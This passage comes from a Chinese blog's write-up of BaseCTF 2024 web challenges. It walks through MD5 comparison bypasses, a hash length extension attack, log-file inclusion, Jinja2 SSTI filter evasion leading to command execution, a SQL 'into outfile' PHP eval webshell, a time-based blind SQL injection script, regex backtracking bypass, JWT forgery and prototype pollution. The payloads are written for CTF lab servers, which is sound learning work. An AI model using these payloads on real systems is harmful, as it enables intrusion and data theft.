class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 所以你说你懂 MD5 了?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$apple</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;banana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$apple</span> !== <span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;加强难度就不会了?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 什么? 你绕过去了?</span></span><br><span class="line"><span class="comment">// 加大剂量!</span></span><br><span class="line"><span class="comment">// 我要让他成为 string</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;appple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;bananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) == <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;难吗?不难!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你还是绕过去了?</span></span><br><span class="line"><span class="comment">// 哦哦哦, 我少了一个等于号</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;apppple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;banananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你以为这就结束了</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你想看到 random 的值吗?</span></span><br><span class="line"><span class="comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span></span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$random</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if name ends with &#x27;admin&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">5</span>) !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;不是管理员也来凑热闹?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$random</span> . <span class="variable">$name</span>) !== <span class="variable">$md5</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;伪造? NO NO NO!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 认输了, 看样子你真的很懂 MD5</span></span><br><span class="line"><span class="comment">// 那 flag 就给你吧</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;看样子你真的很懂 MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>第一层：用数组绕过</p>
<p>第二层：要求必须是字符串，但是MD5是弱相等，可以寻找两种字符串加密后MD5值是0e开头的，网上一大堆</p>
<p>例如：QNKCDZO，s155964671a</p>
<p>第三层：必须是字符串但是要是强相等，也就是加密后md5值必须相同，网上也能找到这两串</p>
<p>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p>
<p>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>
<p>注意这两串要用bp抓包传，hackbar因为编码问题传入这两个会解析错误，具体原因我也不明白</p>
<p>第四层：告诉你random的MD5值，要求name参数必须以admin结尾，并且满足random和name值拼起来的MD5值等于传参的md5值。这里要用MD5拓展长度攻击</p>
<p>脚本：<a target="_blank" rel="noopener" href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p>
<p><img src="/source/images/2024BaseCTF-web/15.png"></p>
<p><img src="/source/images/2024BaseCTF-web/16.png"> </p>
<h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h3 id="滤个不停"><a href="#滤个不停" class="headerlink" title="滤个不停"></a>滤个不停</h3><p><img src="/source/images/2024BaseCTF-web/17-1725527588466.png"></p>
<p>要求包含那些字母，但不包含伪协议</p>
<p>仔细看那些字母发现提示你访问日志文件&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，这题考察日志文件包含漏洞</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45785288/article/details/109730830%E8%BF%99%E7%AF%87%E8%AE%B2%E7%9A%84%E5%BE%88%E7%BB%86%E3%80%82">https://blog.csdn.net/weixin_45785288/article/details/109730830这篇讲的很细。</a></p>
<p><img src="/source/images/2024BaseCTF-web/18-1725527717758.png"></p>
<p>抓包强行写入不存在的请求，放包后，此时我们构造的代码被写入到日志文件中</p>
<p>然后再次访问该日志文件，我们写入的代码就会被执行了</p>
<p><img src="/source/images/2024BaseCTF-web/19.png"></p>
<h3 id="玩原神玩的"><a href="#玩原神玩的" class="headerlink" title="玩原神玩的"></a>玩原神玩的</h3><p><img src="/source/images/2024BaseCTF-web/26.png"></p>
<p>一共4层</p>
<p>第一次传参数组，要求元素个数与array数组相同，这里不知道array数组元素个数，我们可以写脚本依次尝试，或者手动传参尝试。这里我贴个脚本，但是有时候不能运行，自己编程水平太菜了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://challenge.basectf.fun:37972/&#x27;</span></span><br><span class="line">successful_len = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    payload = &#123;<span class="string">f&#x27;len[<span class="subst">&#123;j&#125;</span>]&#x27;</span>: <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i)&#125;</span><br><span class="line">    response = requests.post(url, data=payload)</span><br><span class="line">    last_line = response.text.splitlines()[-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Trying with <span class="subst">&#123;i&#125;</span> len[] parameters: <span class="subst">&#123;last_line&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;我不管，我要玩原神！😭😭😭&quot;</span> <span class="keyword">in</span> last_line:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Success with <span class="subst">&#123;i&#125;</span> parameters!&quot;</span>)</span><br><span class="line">        successful_len = i  </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line"><span class="keyword">if</span> successful_len:</span><br><span class="line">    payload_str = <span class="string">&#x27;&amp;&#x27;</span>.join([<span class="string">f&#x27;len[<span class="subst">&#123;j&#125;</span>]=0&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(successful_len)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final payload: <span class="subst">&#123;payload_str&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>最后跑出来元素个数为45,</p>
<p>len[]&#x3D;0&amp;len[]&#x3D;1&amp;len[]&#x3D;2&amp;len[]&#x3D;3&amp;len[]&#x3D;4&amp;len[]&#x3D;5&amp;len[]&#x3D;6&amp;len[]&#x3D;7&amp;len[]&#x3D;8&amp;len[]&#x3D;9&amp;len[]&#x3D;10&amp;len[]&#x3D;11&amp;len[]&#x3D;12&amp;len[]&#x3D;13&amp;len[]&#x3D;14&amp;len[]&#x3D;15&amp;len[]&#x3D;16&amp;len[]&#x3D;17&amp;len[]&#x3D;18&amp;len[]&#x3D;19&amp;len[]&#x3D;20&amp;len[]&#x3D;21&amp;len[]&#x3D;22&amp;len[]&#x3D;23&amp;len[]&#x3D;24&amp;len[]&#x3D;25&amp;len[]&#x3D;26&amp;len[]&#x3D;27&amp;len[]&#x3D;28&amp;len[]&#x3D;29&amp;len[]&#x3D;30&amp;len[]&#x3D;31&amp;len[]&#x3D;32&amp;len[]&#x3D;33&amp;len[]&#x3D;34&amp;len[]&#x3D;35&amp;len[]&#x3D;36&amp;len[]&#x3D;37&amp;len[]&#x3D;38&amp;len[]&#x3D;39&amp;len[]&#x3D;40&amp;len[]&#x3D;41&amp;len[]&#x3D;42&amp;len[]&#x3D;43&amp;len[]&#x3D;44</p>
<p>第二层get传参tip&#x3D;我要玩原神</p>
<p>第三层也是传数组，该数组第一个元素为100%，第二个元素为love100%加上100%的MD5值。</p>
<p>注意有%，所以要url编码，%的url编码后为%25</p>
<p><img src="/source/images/2024BaseCTF-web/27.png"></p>
<p>第四层将得到的json编码后的数组进行逆向解密</p>
<p>直接脚本爆破即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="comment"># 假设这是从 PHP 代码中获得的 JSON 编码的哈希值列表</span></span><br><span class="line">enc = []<span class="comment">#填入获取的哈希值列表</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="built_in">str</span>(c^i).encode()).hexdigest()==enc[i]):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h3><p><img src="/source/images/2024BaseCTF-web/24.png"></p>
<p>要求get方法传参Jail_by.Happy。但是当php版本小于8时，get请求的参数名中如果有.会转换成_</p>
<p>但是如果参数名中有[，那么此时[会自动转换为_，此时参数后面的.就不会转换成__了。</p>
<p>所以get传参?Jail[by.Happy,经过转换后就能变为Jail_by.Happy</p>
<p>查看页面源码发现ph0_info_Like_jail.php文件访问后时phpinfo信息</p>
<p><img src="/source/images/2024BaseCTF-web/25.png"></p>
<p>过滤了这么多函数，但是highlight没有过滤。然后我这个菜鸡看了官方文档了解新的glob命令</p>
<p>payload：?Jail[by.Happy&#x3D;highlight_file(glob(“&#x2F;f*”)[0]);</p>
<p>利用glob搜索所有以f开头的文件。[0]是取第一个。然后highlight_file将文件内容显示出来</p>
<h3 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h3><p>一般这种复读和回声的题目考的都是ssti，但是这题过滤有点多，不会绕，看了官方wp才理解</p>
<p>这题过滤了+ - * &#x2F; . {} __ : “ \</p>
<p>两个{}在Jinja2中作为变量包裹标识符，但是被过滤了，我们可以用{}加%的标签</p>
<p>.号被过滤，我们用[来绕过，__被过滤，我们可以用单引号分开来表示 </p>
<p>先找到可以rce的类例如&lt;class ‘os._wrap_close’&gt;，这个类一般在第139位左右，我们可以在139附近找</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%print(&#x27;&#x27;[&#x27;_&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_m&#x27;&#x27;ro_&#x27;&#x27;_&#x27;][1][&#x27;_&#x27;&#x27;_subcl&#x27;&#x27;asses_&#x27;&#x27;_&#x27;]()[137])%&#125;</span><br></pre></td></tr></table></figure>

<p>这个效果相当于<img src="/source/images/2024BaseCTF-web/28.png"></p>
<p><img src="/source/images/2024BaseCTF-web/29.png"></p>
<p>回显了这个类，接着我们用这个类里的popen方法进行rce</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%print(&#x27;&#x27;[&#x27;_&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_m&#x27;&#x27;ro_&#x27;&#x27;_&#x27;][1][&#x27;_&#x27;&#x27;_subcl&#x27;&#x27;asses_&#x27;&#x27;_&#x27;]()[137][&#x27;_&#x27;&#x27;_in&#x27;&#x27;it_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_gl&#x27;&#x27;obals_&#x27;&#x27;_&#x27;][&#x27;po&#x27;&#x27;pen&#x27;](&#x27;env&#x27;)[&#x27;re&#x27;&#x27;ad&#x27;]())%&#125;</span><br></pre></td></tr></table></figure>

<p>查看环境变量，发现<img src="/source/images/2024BaseCTF-web/30.png"></p>
<p>利用这个变量切换到根目录然后读取flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%print(&#x27;&#x27;[&#x27;_&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_m&#x27;&#x27;ro_&#x27;&#x27;_&#x27;][1][&#x27;_&#x27;&#x27;_subcl&#x27;&#x27;asses_&#x27;&#x27;_&#x27;]()[137][&#x27;_&#x27;&#x27;_in&#x27;&#x27;it_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_gl&#x27;&#x27;obals_&#x27;&#x27;_&#x27;][&#x27;po&#x27;&#x27;pen&#x27;](&#x27;cd $OLDPWD;cat flag&#x27;)[&#x27;re&#x27;&#x27;ad&#x27;]())%&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h3 id="flag直接读取不就行了？"><a href="#flag直接读取不就行了？" class="headerlink" title="flag直接读取不就行了？"></a>flag直接读取不就行了？</h3><p><img src="/source/images/2024BaseCTF-web/20.png"></p>
<p>DirectoryIterator是php内置遍历目录的类，参数填要遍历的目录路径，我们从根目录开始看，就发现了secret文件夹</p>
<p><img src="/source/images/2024BaseCTF-web/21.png"></p>
<p>继续访问文件夹：</p>
<p><img src="/source/images/2024BaseCTF-web/22.png"></p>
<p>看到了flag文件，我们使用内置类读取它</p>
<p><img src="/source/images/2024BaseCTF-web/23.png"></p>
<p>然后打开页面源代码即可发现flag</p>
<h3 id="No-JWT"><a href="#No-JWT" class="headerlink" title="No JWT"></a>No JWT</h3><p>主要就是了解一下什么是jwt</p>
<p>下载源码，分析源码，我们先访问&#x2F;login，然后post方法传参username和password。注意要是json编码的格式，然后会返回给我们token。</p>
<p><img src="/source/images/2024BaseCTF-web/31.png"></p>
<p>拿着token去解密网站解密，修改payload部分role值为admin</p>
<p>jwt解密网:<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
<p>然后base64加密payload部分。将原来的token中payload部分换成新的payload即可。</p>
<p>注意：加密新payload时后面的<strong>Signature</strong>部分会改变，我们不要管，只选择相应颜色的加密部分即可</p>
<p>然后访问&#x2F;flag。利用Authorization头传token即可</p>
<p><img src="/source/images/2024BaseCTF-web/32.png"></p>
<p>注意这个头不能放在最后，要放到靠前的位置。不然无回显具体原因我也不清楚。</p>
<h3 id="圣钥之战1-0"><a href="#圣钥之战1-0" class="headerlink" title="圣钥之战1.0"></a>圣钥之战1.0</h3><p>最基础的原型污染链</p>
<p>提示访问&#x2F;read，给了源码。</p>
<p>&#x2F;pollute进行污染，&#x2F;read是读取的</p>
<p>我们访问&#x2F;pollute进行原型链污染</p>
<p><img src="/source/images/2024BaseCTF-web/image-20240907162619965.png" alt="image-20240907162619965"></p>
<p>想这样直接读flag文件，放包后显示污染成功。然后我们访问&#x2F;read，此时已经读取到了flag</p>
<h3 id="only-one-sql"><a href="#only-one-sql" class="headerlink" title="only one sql"></a>only one sql</h3><p><img src="/source/images/2024BaseCTF-web/37.png"></p>
<p><strong>方法一</strong>：学到了代替select的方法：values</p>
<p>?sql&#x3D;values(0x3c3f706870206576616c28245f504f53545b2761275d293b3f3e) into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php’</p>
<p>将一句话木马<?php eval($_POST['a']);?>转为16进制写入文件中，然后访问</p>
<p><img src="/source/images/2024BaseCTF-web/36.png"></p>
<p>即可查看flag</p>
<p><strong>方法二</strong>：show tables查看表，发现flag表，然后show columns from flag查字段发现两个字段，一个id一个data。盲猜flag在data字段。写脚本–时间盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">sqlstr=string.ascii_lowercase + string.digits +<span class="string">&#x27;_&#x27;</span>+ <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://your.url/?sql=delete%20from%20flag%20where%20data%20like%20%27&quot;</span></span><br><span class="line">end=<span class="string">&quot;%25%27%20and%20sleep(5)&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> sqlstr:</span><br><span class="line">        payload =url+flag+c+end</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.get(payload,timeout=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(flag+c)</span><br><span class="line">            flag+=c</span><br></pre></td></tr></table></figure>

<p>这个代码感觉有毛病，每次运行结果都不一样</p>
<h1 id="Fin"><a href="#Fin" class="headerlink" title="Fin"></a>Fin</h1><h3 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h3><p>主要考点:回溯绕过非贪婪匹配</p>
<p><img src="/source/images/2024BaseCTF-web/34.png"></p>
<p>第一个要求传参e_m.p 但是get传参参数名中有.会被转换为_，我们传参e[m.p这样[会被转换为下划线后面.就不会被转换成下划线了。</p>
<p>这里要求e_m.p每一个字符都必须是数字。我们用8进制传参0337522,intval函数会自动识别他是8进制并转为10进制这样就绕过了第一个if。</p>
<p>第二个if是贪婪匹配，要求不能有hacker，第三个if要求有hacker但不能在第一位</p>
<p>这里就用回溯绕过传100万个a（但这里我传了100万零1个才能绕过）让他绕过正则，这样也能检测到hacker</p>
<p>a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;stdin&amp;c&#x3D;fgets这三个传参是通过SplFileObject类加上php:&#x2F;&#x2F;stdin流获取我们的输入然后fgets方法读取文件</p>
<p>payload：?e[m.p&#x3D;0337522&amp;a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;stdin&amp;c&#x3D;fgets</p>
<p>try&#x3D;aaa(100万个)hacker&amp;shell&#x3D;system(‘cat f*’);</p>
<p><img src="/source/images/2024BaseCTF-web/35.png"></p>
<h3 id="Back-to-the-future"><a href="#Back-to-the-future" class="headerlink" title="Back to the future"></a>Back to the future</h3><p>看名字想到机器人? 查看robots.txt</p>
<p>发现禁止访问&#x2F;.git</p>
<p>git泄露，但是我git扫不出来，用这个</p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a></p>
<p>cd Git_Extract</p>
<p>python 2 git_extract.py URL&#x2F;.git&#x2F;</p>
<h3 id="Jinja-Mark"><a href="#Jinja-Mark" class="headerlink" title="Jinja Mark"></a>Jinja Mark</h3><p><img src="/source/images/2024BaseCTF-web/38.png"></p>
<p>&#x2F;index路由是ssti注入(有过滤)，我们先去&#x2F;flag提示我们要爆破找数字.bp抓包爆破</p>
<p><img src="/source/images/2024BaseCTF-web/39.png"></p>
<p><img src="/source/images/2024BaseCTF-web/40.png"></p>
<p>第一行告诉我们&#x2F;index路由里的过滤是{}  然后&#x2F;magic可以进行原型链污染</p>
<p> <img src="/source/images/2024BaseCTF-web/41.png"></p>
<p>污染成功，取index路由进行ssti注入即可</p>
<p>payload: &lt;&lt;lipsum.__globals__.__builtins__.open(‘flag’).read()&gt;&gt;</p>
<h3 id="RCE-or-Sql-Inject"><a href="#RCE-or-Sql-Inject" class="headerlink" title="RCE or Sql Inject"></a>RCE or Sql Inject</h3><p><img src="/source/images/2024BaseCTF-web/42.png"></p>
<p>%0a换行符过掉–注释符</p>
<p>mysql命令行中system和\!可以直接执行一个系统shell命令。</p>
<p>payload: ?sql&#x3D;%0a system env</p>
<h3 id="Sql-Inject-or-RCE"><a href="#Sql-Inject-or-RCE" class="headerlink" title="Sql Inject or RCE"></a>Sql Inject or RCE</h3><p>过滤增多了一点，上一题的没法用了，但是这题学到好多知识</p>
<p>delimiter：更改mysql语句的结束符</p>
<p><img src="/source/images/2024BaseCTF-web/43.png"></p>
<p>于是乎，找到代替;的方法了，那么便可以进行堆叠注入了</p>
<p>select被禁，我们用handler</p>
<p><img src="/source/images/2024BaseCTF-web/44.png"></p>
<p>payload:%0adelimiter aa%0ahandler flag openaa%0ahandler flag read next</p>
</section>
    
        
        <h2 class="footline">
            <a href="/tags/web/#web">web</a>
        </h2>
    

    <footer id="post-meta" class="clearfix">
        <a href="/about/">
        <img class="avatar" src="/images/avatar.png">
        <div>
            <span class="dark">ccgetflag</span>
            <span></span>
        </div>
        </a>
        <section id="sharing">
            <a title="Share to Twitter" class="twitter" target="_blank" rel="noopener" href="https://twitter.com/intent/tweet?text=http://example.com/2024/09/04/2024BaseCTF-web/2024BaseCTF-web/ - 2024BaseCTF-web @"><span class="icon-twitter">tweet</span></a>
            <a title="Share to Facebook" class="facebook" href="#" onclick="
                window.open(
                  'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
                  'facebook-share-dialog',
                  'width=626,height=436');
                return false;"><span class="icon-facebook-sign">Share</span>
            </a>
        </section>
    </footer>


  <section id="comment">
    <button class="btn" id="loadcmts" onclick="cmts.load();">Load Comments</button>
    <div id="gitment"></div>
    <script src='/js/gitment.browser.js'></script>
    <link rel="stylesheet" href=''>
    <script>
      var cmts={
        load:function cmts(){
          var gitment = new Gitment({
          
            id: "2024BaseCTF-web",
          
            owner: "",
            repo: "",
            oauth: {
              client_id: "",
              client_secret: "",
            },
          })
          gitment.render('gitment');
          var loadcmt = document.getElementById("loadcmts");
          var imyourfather = loadcmt.parentNode;
          imyourfather.removeChild(loadcmts)
        }
      }
    </script>
  </section>


	<footer id="footer">
	<div id="social">
		<p class="small">©  John Doe| Powered by Hexo & 
			<a target="_blank" rel="noopener" href="https://github.com/F0r3at/Lights"> Lights</a>
		</p>
	</div>
</footer>

</section>

	<script src="//cdnjs.loli.net/ajax/libs/instantclick/3.0.1/instantclick.min.js" data-no-instant></script>
	<script data-no-instant>
		
		InstantClick.init('mousedown');
	</script>



